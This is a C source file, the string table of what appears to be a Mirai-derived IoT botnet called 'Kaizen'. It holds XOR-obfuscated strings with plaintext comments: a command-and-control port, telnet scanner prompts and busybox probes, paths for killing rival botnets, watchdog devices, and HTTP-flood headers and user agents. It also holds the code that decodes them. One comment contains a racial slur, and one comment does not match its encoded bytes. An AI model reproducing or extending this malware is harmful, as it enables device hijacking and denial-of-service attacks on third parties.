#define _GNU_SOURCE

#ifdef DEBUG
    #include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "includes.h"
#include "table.h"
#include "util.h"

uint32_t table_key = 0x1337c0d3;
struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{
    add_entry(TABLE_CNC_PORT, "\x3E\x31", 2); // 2310
    add_entry(TABLE_SCAN_CB_PORT, "\x7E\xEF", 2); // 18904
    add_entry(TABLE_EXEC_SUCCESS, "\x7C\x56\x5E\x4D\x52\x59\x17\x7E\x44\x17\x72\x41\x58\x5B\x41\x5E\x59\x50\x37", 19); // Kaizen Is Evolving
    add_entry(TABLE_SCAN_SHELL, "\x44\x5F\x52\x5B\x5B\x37", 6); // shell
    add_entry(TABLE_SCAN_ENABLE, "\x52\x59\x56\x55\x5B\x52\x37", 7); // enable
    add_entry(TABLE_SCAN_SYSTEM, "\x44\x4E\x44\x43\x52\x5A\x37", 7); // system
    add_entry(TABLE_SCAN_SH, "\x64\x7F\x37", 3); // sh
    add_entry(TABLE_SCAN_QUERY, "\x18\x55\x5E\x59\x18\x55\x42\x44\x4E\x55\x58\x4F\x17\x7C\x76\x7E\x6D\x72\x79\x37", 20); // /bin/busybox KAIZEN
    add_entry(TABLE_SCAN_RESP, "\x7C\x76\x7E\x6D\x72\x79\x0D\x17\x56\x47\x47\x5B\x52\x43\x17\x59\x58\x43\x17\x51\x58\x42\x59\x53\x37", 25); // KAIZEN: applet not found
    add_entry(TABLE_SCAN_NCORRECT, "\x59\x54\x58\x45\x45\x52\x54\x43\x37", 9); // ncorrect
    add_entry(TABLE_SCAN_PS, "\x18\x55\x5E\x59\x18\x55\x42\x44\x4E\x55\x58\x4F\x17\x47\x44\x37", 16); // /bin/busybox ps
    add_entry(TABLE_SCAN_KILL_9, "\x18\x55\x5E\x59\x18\x55\x42\x44\x4E\x55\x58\x4F\x17\x5C\x5E\x5B\x5B\x17\x1A\x0E\x37", 22); // /bin/busybox kill -9
    add_entry(TABLE_SCAN_OGIN, "\x58\x50\x5E\x59\x37", 5); // ogin
    add_entry(TABLE_SCAN_ENTER, "\x52\x59\x43\x52\x45\x37", 6); // enter
    add_entry(TABLE_SCAN_ASSWORD, "\x56\x44\x44\x40\x58\x45\x53\x37", 8); // assword
    add_entry(TABLE_KILLER_PROC, "\x18\x47\x45\x58\x54\x18\x37", 7); // /proc/
    add_entry(TABLE_KILLER_EXE, "\x18\x52\x4F\x52\x37", 5); // /exe
    add_entry(TABLE_KILLER_FD, "\x18\x51\x53\x37", 4); // /fd
    add_entry(TABLE_KILLER_MAPS, "\x18\x5A\x56\x47\x44\x37", 6); // /maps
    add_entry(TABLE_KILLER_TCP, "\x18\x47\x45\x58\x54\x18\x59\x52\x43\x18\x43\x54\x47\x37", 14); // /proc/net/tcp
    add_entry(TABLE_EXEC_MIRAI, "\x53\x41\x45\x7F\x52\x5B\x47\x52\x45\x37", 10); // dvrHelper
    add_entry(TABLE_EXEC_SORA1, "\x79\x5E\x70\x70\x52\x65\x01\x0E\x4F\x53\x37", 11); // NiGGeR69xd
    add_entry(TABLE_EXEC_SORA2, "\x06\x04\x04\x00\x64\x58\x45\x56\x7B\x78\x76\x73\x72\x65\x37", 15); // 1337SoraLOADER
    add_entry(TABLE_EXEC_OWARI, "\x6F\x06\x0E\x7E\x05\x04\x0E\x06\x05\x03\x62\x7E\x62\x37", 14); // X19I239124UIU
    add_entry(TABLE_EXEC_JOSHO, "\x06\x03\x71\x56\x37", 5); // 14Fa
    add_entry(TABLE_EXEC_APOLLO, "\x54\x54\x76\x73\x37", 5); // ccAD
	add_entry(TABLE_EXEC_KATRINA, "\x7C\x56\x43\x45\x5E\x59\x56\x04\x05\x37", 10); // Katrina32
	add_entry(TABLE_EXEC_JOSHO3, "\x60\x44\x70\x76\x03\x77\x71\x01\x71\x37", 10); // WsGA4@F6F
	add_entry(TABLE_EXEC_MASUTA, "\x44\x4E\x44\x50\x47\x42\x37", 7); // sysgpu (not masuta lmao)
	add_entry(TABLE_EXEC_DADDYLEET, "\x76\x55\x76\x53\x37", 5); // AbAd
	add_entry(TABLE_EXEC_QBOT, "\x7B\x78\x7B\x79\x78\x70\x63\x71\x78\x37", 10); // LOLNOGTFO
	add_entry(TABLE_EXEC_OGOWARI, "\x7E\x42\x6E\x50\x42\x5D\x52\x7E\x46\x59\x37", 11); // IuYgujeIqn
	add_entry(TABLE_EXEC_OPOWARI, "\x7E\x42\x71\x53\x7C\x44\x44\x74\x4F\x4D\x37", 11); // IuFdKssCxz
	add_entry(TABLE_EXEC_MIRAI2, "\x56\x44\x44\x40\x58\x45\x53\x37", 8); // assword
	add_entry(TABLE_EXEC_QBOT2, "\x45\x58\x58\x43\x37", 5); // root / this will kill some crappy mirais too
	add_entry(TABLE_EXEC_DEVNULL, "\x18\x53\x52\x41\x18\x59\x42\x5B\x5B\x37", 10); // /dev/null
	add_entry(TABLE_EXEC_KETASHI, "\x7C\x72\x63\x76\x64\x7F\x7E\x04\x05\x37", 10); // KETASHI32
	add_entry(TABLE_EXEC_KETASHI2, "\x7C\x56\x5E\x4D\x52\x59\x17\x7E\x44\x17\x72\x41\x58\x5B\x41\x5E\x59\x50\x37", 19); // 0DnAzepd (Omni)
    add_entry(TABLE_IOCTL_KEEPALIVE1, "\x18\x53\x52\x41\x18\x40\x56\x43\x54\x5F\x53\x58\x50\x37", 14); // /dev/watchdog
    add_entry(TABLE_IOCTL_KEEPALIVE2, "\x18\x53\x52\x41\x18\x5A\x5E\x44\x54\x18\x40\x56\x43\x54\x5F\x53\x58\x50\x37", 19); // /dev/misc/watchdog
    add_entry(TABLE_IOCTL_KEEPALIVE3, "\x18\x53\x52\x41\x18\x71\x63\x60\x73\x63\x06\x07\x06\x68\x40\x56\x43\x54\x5F\x53\x58\x50\x37", 23); // /dev/FTWDT101_watchdog
    add_entry(TABLE_IOCTL_KEEPALIVE4, "\x18\x53\x52\x41\x18\x71\x63\x60\x73\x63\x06\x07\x06\x6B\x17\x40\x56\x43\x54\x5F\x53\x58\x50\x37", 24); // /dev/FTWDT101\ watchdog
    add_entry(TABLE_RANDOM, "\x06\x62\x7A\x7C\x76\x6E\x66\x6E\x62\x03\x45\x0F\x73\x04\x75\x56\x61\x05\x5A\x61\x40\x67\x78\x70\x71\x03\x47\x5E\x51\x5B\x61\x5A\x41\x74\x6E\x02\x00\x54\x71\x5A\x64\x5D\x78\x75\x76\x5F\x06\x5B\x74\x67\x4E\x7B\x64\x07\x42\x7A\x58\x5D\x7F\x4D\x03\x42\x79\x59\x37", 65); // 1UMKAYQYU4r8D3BaV2mVwPOGF4piflVmvCY57cFmSjOBAh1lCPyLS0uMojHz4uNn
	add_entry(TABLE_ATK_VSE, "\x63\x64\x58\x42\x45\x54\x52\x17\x72\x59\x50\x5E\x59\x52\x17\x66\x42\x52\x45\x4E\x37", 21); // TSource Engine Query
    add_entry(TABLE_ATK_RESOLVER, "\x18\x52\x43\x54\x18\x45\x52\x44\x58\x5B\x41\x19\x54\x58\x59\x51\x37", 17); // /etc/resolv.conf
    add_entry(TABLE_ATK_NSERV, "\x59\x56\x5A\x52\x44\x52\x45\x41\x52\x45\x37", 11); // nameserver
	
	add_entry(TABLE_ATK_ACCEPT, "\x76\x54\x54\x52\x47\x43\x0D\x17\x43\x52\x4F\x43\x18\x5F\x43\x5A\x5B\x1B\x56\x47\x47\x5B\x5E\x54\x56\x43\x5E\x58\x59\x18\x4F\x5F\x43\x5A\x5B\x1C\x4F\x5A\x5B\x1B\x56\x47\x47\x5B\x5E\x54\x56\x43\x5E\x58\x59\x18\x4F\x5A\x5B\x0C\x46\x0A\x07\x19\x0E\x1B\x5E\x5A\x56\x50\x52\x18\x40\x52\x55\x47\x1B\x1D\x18\x1D\x0C\x46\x0A\x07\x19\x0F\x37", 83);
    add_entry(TABLE_ATK_ACCEPT_LNG, "\x76\x54\x54\x52\x47\x43\x1A\x7B\x56\x59\x50\x42\x56\x50\x52\x0D\x17\x52\x59\x1A\x62\x64\x1B\x52\x59\x0C\x46\x0A\x07\x19\x0F\x37", 32);
    add_entry(TABLE_ATK_CONTENT_TYPE, "\x74\x58\x59\x43\x52\x59\x43\x1A\x63\x4E\x47\x52\x0D\x17\x56\x47\x47\x5B\x5E\x54\x56\x43\x5E\x58\x59\x18\x4F\x1A\x40\x40\x40\x1A\x51\x58\x45\x5A\x1A\x42\x45\x5B\x52\x59\x54\x58\x53\x52\x53\x37", 48);
    add_entry(TABLE_ATK_SET_COOKIE, "\x44\x52\x43\x74\x58\x58\x5C\x5E\x52\x1F\x10\x37", 12);
    add_entry(TABLE_ATK_REFRESH_HDR, "\x45\x52\x51\x45\x52\x44\x5F\x0D\x37", 9);
    add_entry(TABLE_ATK_LOCATION_HDR, "\x5B\x58\x54\x56\x43\x5E\x58\x59\x0D\x37", 10);
    add_entry(TABLE_ATK_SET_COOKIE_HDR, "\x44\x52\x43\x1A\x54\x58\x58\x5C\x5E\x52\x0D\x37", 12);
    add_entry(TABLE_ATK_CONTENT_LENGTH_HDR, "\x54\x58\x59\x43\x52\x59\x43\x1A\x5B\x52\x59\x50\x43\x5F\x0D\x37", 16);
    add_entry(TABLE_ATK_TRANSFER_ENCODING_HDR, "\x43\x45\x56\x59\x44\x51\x52\x45\x1A\x52\x59\x54\x58\x53\x5E\x59\x50\x0D\x37", 19);
    add_entry(TABLE_ATK_CHUNKED, "\x54\x5F\x42\x59\x5C\x52\x53\x37", 8);
    add_entry(TABLE_ATK_KEEP_ALIVE_HDR, "\x5C\x52\x52\x47\x1A\x56\x5B\x5E\x41\x52\x37", 11);
    add_entry(TABLE_ATK_CONNECTION_HDR, "\x54\x58\x59\x59\x52\x54\x43\x5E\x58\x59\x0D\x37", 12);
    add_entry(TABLE_ATK_DOSARREST, "\x44\x52\x45\x41\x52\x45\x0D\x17\x53\x58\x44\x56\x45\x45\x52\x44\x43\x37", 18);
    add_entry(TABLE_ATK_CLOUDFLARE_NGINX, "\x44\x52\x45\x41\x52\x45\x0D\x17\x54\x5B\x58\x42\x53\x51\x5B\x56\x45\x52\x1A\x59\x50\x5E\x59\x4F\x37", 25);
    add_entry(TABLE_HTTP_ONE, "\x7A\x58\x4D\x5E\x5B\x5B\x56\x18\x02\x19\x07\x17\x1F\x60\x5E\x59\x53\x58\x40\x44\x17\x79\x63\x17\x06\x07\x19\x07\x0C\x17\x60\x5E\x59\x01\x03\x0C\x17\x4F\x01\x03\x1E\x17\x76\x47\x47\x5B\x52\x60\x52\x55\x7C\x5E\x43\x18\x02\x04\x00\x19\x04\x01\x17\x1F\x7C\x7F\x63\x7A\x7B\x1B\x17\x5B\x5E\x5C\x52\x17\x70\x52\x54\x5C\x58\x1E\x17\x74\x5F\x45\x58\x5A\x52\x18\x01\x02\x19\x07\x19\x04\x04\x05\x02\x19\x06\x0F\x06\x17\x64\x56\x51\x56\x45\x5E\x18\x02\x04\x00\x19\x04\x01\x37", 116); 
    add_entry(TABLE_HTTP_TWO, "\x7A\x58\x4D\x5E\x5B\x5B\x56\x18\x02\x19\x07\x17\x1F\x7A\x56\x54\x5E\x59\x43\x58\x44\x5F\x0C\x17\x7E\x59\x43\x52\x5B\x17\x7A\x56\x54\x17\x78\x64\x17\x6F\x17\x06\x07\x68\x00\x68\x02\x1E\x17\x76\x47\x47\x5B\x52\x60\x52\x55\x7C\x5E\x43\x18\x02\x04\x00\x19\x00\x0F\x19\x05\x17\x1F\x7C\x7F\x63\x7A\x7B\x1B\x17\x5B\x5E\x5C\x52\x17\x70\x52\x54\x5C\x58\x1E\x17\x61\x52\x45\x44\x5E\x58\x59\x18\x01\x19\x06\x19\x01\x17\x64\x56\x51\x56\x45\x5E\x18\x02\x04\x00\x19\x00\x0F\x19\x05\x37", 118);
    add_entry(TABLE_HTTP_THREE, "\x7A\x58\x4D\x5E\x5B\x5B\x56\x18\x02\x19\x07\x17\x1F\x60\x5E\x59\x53\x58\x40\x44\x17\x79\x63\x17\x01\x19\x06\x0C\x17\x60\x5E\x59\x01\x03\x0C\x17\x4F\x01\x03\x0C\x17\x45\x41\x0D\x02\x0E\x19\x07\x1E\x17\x70\x52\x54\x5C\x58\x18\x05\x07\x06\x07\x07\x06\x07\x06\x17\x71\x5E\x45\x52\x51\x58\x4F\x18\x02\x0E\x19\x07\x37", 78);
    add_entry(TABLE_HTTP_FOUR, "\x7A\x58\x4D\x5E\x5B\x5B\x56\x18\x02\x19\x07\x17\x1F\x6F\x06\x06\x0C\x17\x7B\x5E\x59\x42\x4F\x17\x4F\x0F\x01\x68\x01\x03\x1E\x17\x76\x47\x47\x5B\x52\x60\x52\x55\x7C\x5E\x43\x18\x02\x04\x00\x19\x04\x01\x17\x1F\x7C\x7F\x63\x7A\x7B\x1B\x17\x5B\x5E\x5C\x52\x17\x70\x52\x54\x5C\x58\x1E\x17\x74\x5F\x45\x58\x5A\x52\x18\x01\x04\x19\x07\x19\x04\x05\x04\x0E\x19\x06\x04\x05\x17\x64\x56\x51\x56\x45\x5E\x18\x02\x04\x00\x19\x04\x01\x37", 106);
    add_entry(TABLE_HTTP_FIVE, "\x7A\x58\x4D\x5E\x5B\x5B\x56\x18\x02\x19\x07\x17\x1F\x7A\x56\x54\x5E\x59\x43\x58\x44\x5F\x0C\x17\x7E\x59\x43\x52\x5B\x17\x7A\x56\x54\x17\x78\x64\x17\x6F\x17\x06\x07\x68\x06\x07\x68\x02\x1E\x17\x76\x47\x47\x5B\x52\x60\x52\x55\x7C\x5E\x43\x18\x01\x07\x06\x19\x02\x19\x06\x00\x17\x1F\x7C\x7F\x63\x7A\x7B\x1B\x17\x5B\x5E\x5C\x52\x17\x70\x52\x54\x5C\x58\x1E\x37", 89);

}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

    #ifdef DEBUG
        if(!val->locked)
        {
            printf("[table] Tried to double-unlock value %d\n", id);
            return;
        }
    #endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

    #ifdef DEBUG
        if(val->locked)
        {
            printf("[table] Tried to double-lock value\n");
            return;
        }
    #endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

    #ifdef DEBUG
        if(val->locked)
        {
            printf("[table] Tried to access table.%d but it is locked\n", id);
            return NULL;
        }
    #endif

    if(len != NULL)
        *len = (int)val->val_len;

    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;

    #ifdef DEBUG
        table[id].locked = TRUE;
    #endif
}

static void toggle_obf(uint8_t id)
{
    int i = 0;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for(i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }

    #ifdef DEBUG
        val->locked = !val->locked;
    #endif
}

